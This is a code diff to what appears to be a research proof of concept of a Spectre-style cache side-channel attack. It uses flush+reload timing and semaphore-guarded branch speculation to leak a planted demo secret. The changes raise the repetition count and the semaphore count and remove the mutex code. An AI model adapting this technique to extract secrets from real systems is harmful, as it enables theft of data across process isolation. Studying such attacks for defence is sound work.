@@ -1,6 +1,5 @@
 #include <stdio.h>
 #include <time.h>
-#include <pthread.h>
 #include <semaphore.h>
 
 #include "../lib/gen_array.c"
@@ -10,18 +9,15 @@
 #define CACHE_HIT   100
 #define N_PAGES     256
 
-#define REPETITIONS 100
+#define REPETITIONS 10000
 #define N_TRAINING  10
 #define SECRET_SIZE 9
 #define SECRET      "mysecret"
-#define SEM_COUNT   1
+#define SEM_COUNT   4
 
 #define false       0
 #define true        1
 #define DBG         0
-
-#define FLAG PTHREAD_MUTEX_DEFAULT
-//#define FLAG PTHREAD_MUTEX_ADAPTIVE_NP
 
 cp_t* flush_reload_arr;
 
@@ -63,7 +59,8 @@ void victim_func(int sem_index, int secret_index) {
     //Set value of respective sem0_var or sem1_var to 0.
     sem_t* sem0or1_address;
     sem0or1_address = sem01_addresses[sem_index];
-    sem_wait(sem0or1_address);
+    for(int i = 0; i < SEM_COUNT; i++)
+        sem_wait(sem0or1_address);
     *sem0or1var_addresses[sem_index] = 0;
 
     //Remove sem0 from cache, so that the branch will speculatively execute.
@@ -73,7 +70,8 @@ void victim_func(int sem_index, int secret_index) {
     attack_func(&sem0, &sem0_var, secret_index);
 
     cpuid();
-    sem_post(sem0or1_address);
+    for(int i = 0; i < SEM_COUNT; i++)
+        sem_post(sem0or1_address);
     sem_destroy(&sem0);
     sem_destroy(&sem1);
 }
